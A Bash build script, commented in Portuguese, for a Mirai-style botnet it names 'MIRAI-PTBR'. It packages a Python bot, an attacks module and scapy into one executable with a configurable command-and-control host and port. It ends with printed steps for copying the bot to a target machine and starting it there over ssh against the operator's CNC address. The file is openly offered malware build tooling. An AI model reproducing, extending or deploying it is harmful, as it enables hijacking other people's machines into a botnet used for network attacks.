#!/bin/bash
# build.sh — Compila o bot para executável único com PyInstaller
# Uso: ./build.sh [--minimal] [--onefile]

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
BOT_DIR="$SCRIPT_DIR"
OUTPUT_DIR="$PROJECT_DIR/dist"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configurações padrão
CNC_HOST="${CNC_HOST:-127.0.0.1}"
CNC_PORT="${CNC_PORT:-48101}"
USE_MINIMAL=false
USE_ONEFILE=false

# Parse args
for arg in "$@"; do
    case "$arg" in
        --minimal) USE_MINIMAL=true ;;
        --onefile) USE_ONEFILE=true ;;
    esac
done

echo -e "${GREEN}[*] MIRAI-PTBR Bot Builder${NC}"
echo -e "${YELLOW}[*] CNC Target: ${CNC_HOST}:${CNC_PORT}${NC}"
echo ""

# Verifica Python
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}[!] Python3 não encontrado${NC}"
    exit 1
fi

# Verifica PyInstaller
if ! python3 -c "import PyInstaller" 2>/dev/null; then
    echo -e "${YELLOW}[*] Instalando PyInstaller...${NC}"
    pip3 install pyinstaller
fi

# Cria diretório de output
mkdir -p "$OUTPUT_DIR"

# Escolhe qual bot compilar
if [ "$USE_MINIMAL" = true ]; then
    BOT_SCRIPT="$BOT_DIR/bot_minimal.py"
    BOT_NAME="mirai_bot_minimal"
    echo -e "${YELLOW}[*] Compilando versão MINIMAL...${NC}"
else
    BOT_SCRIPT="$BOT_DIR/bot.py"
    BOT_NAME="mirai_bot"
    echo -e "${YELLOW}[*] Compilando versão COMPLETA...${NC}"
fi

# Cria um script temporário com CNC configurado
TEMP_SCRIPT="/tmp/${BOT_NAME}_build.py"

if [ "$USE_MINIMAL" = true ]; then
    # Versão minimal: substitui CNC_HOST diretamente
    cat "$BOT_SCRIPT" | sed "s/'127.0.0.1'/'${CNC_HOST}'/g" > "$TEMP_SCRIPT"
else
    # Versão completa: configura via argumento
    cat "$BOT_SCRIPT" > "$TEMP_SCRIPT"
fi

# Comando PyInstaller
PYINSTALLER_ARGS=(
    --onefile          # Único executável
    --distpath "$OUTPUT_DIR"
    --workpath "/tmp/pyi_build_${BOT_NAME}"
    --specpath "/tmp/pyi_build_${BOT_NAME}"
    --name "$BOT_NAME"
    --add-data "$PROJECT_DIR/cnc/protocol.py:cnc/"
    --add-data "$PROJECT_DIR/attacks:attacks/"
    --hidden-import "scapy"
    --hidden-import "scapy.all"
    --noconfirm
)

# Se for onefile, não precisa de --onefile extra
if [ "$USE_ONEFILE" = true ]; then
    PYINSTALLER_ARGS+=(--onefile)
fi

# Executa PyInstaller
echo -e "${GREEN}[*] Compilando...${NC}"
python3 -m PyInstaller "${PYINSTALLER_ARGS[@]}" "$TEMP_SCRIPT"

# Verifica resultado
if [ -f "$OUTPUT_DIR/$BOT_NAME" ] || [ -f "$OUTPUT_DIR/$BOT_NAME.exe" ]; then
    EXECUTABLE="$OUTPUT_DIR/$BOT_NAME"
    [ -f "$OUTPUT_DIR/$BOT_NAME.exe" ] && EXECUTABLE="$OUTPUT_DIR/$BOT_NAME.exe"
    
    SIZE=$(du -h "$EXECUTABLE" | cut -f1)
    echo ""
    echo -e "${GREEN}[✓] Build concluído!${NC}"
    echo -e "${GREEN}[*] Executável: $EXECUTABLE${NC}"
    echo -e "${GREEN}[*] Tamanho: $SIZE${NC}"
    
    # Teste rápido
    echo ""
    echo -e "${YELLOW}[*] Informações do binário:${NC}"
    file "$EXECUTABLE"
else
    echo -e "${RED}[!] Erro no build${NC}"
    exit 1
fi

# Limpa temporários
rm -f "$TEMP_SCRIPT"

echo ""
echo -e "${GREEN}[*] Para testar:${NC}"
echo "  # Terminal 1: Inicie o CNC"
echo "  python cnc/main.py"
echo ""
echo "  # Terminal 2: Execute o bot"
echo "  $EXECUTABLE --cnc 127.0.0.1 --port 48101"
echo ""
echo -e "${GREEN}[*] Para deploy remoto:${NC}"
echo "  scp $EXECUTABLE usuario@alvo:/tmp/bot"
echo "  ssh usuario@alvo '/tmp/bot --cnc SEU_CNC_IP --port 48101 &'"
